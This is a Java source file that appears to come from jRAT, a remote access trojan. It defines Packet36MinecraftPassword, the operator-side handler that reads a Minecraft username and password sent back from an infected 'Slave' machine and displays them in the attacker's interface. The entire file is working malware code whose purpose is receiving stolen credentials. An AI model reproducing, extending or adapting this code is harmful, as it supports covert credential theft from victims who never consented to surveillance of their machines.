package pro.jrat.packets.incoming;

import java.io.DataInputStream;

import pro.jrat.Slave;
import pro.jrat.ui.frames.FrameMinecraft;


public class Packet36MinecraftPassword extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String first = slave.readLine();
		String second = slave.readLine();

		FrameMinecraft frame = FrameMinecraft.instances.get(slave);

		if (frame != null) {
			if (first.equals("ERR")) {
				frame.setStatus(second, true);
			} else {
				frame.setUserPass(first, second);
				frame.setStatus("Done reading passwords", false);
			}
		}
	}

}
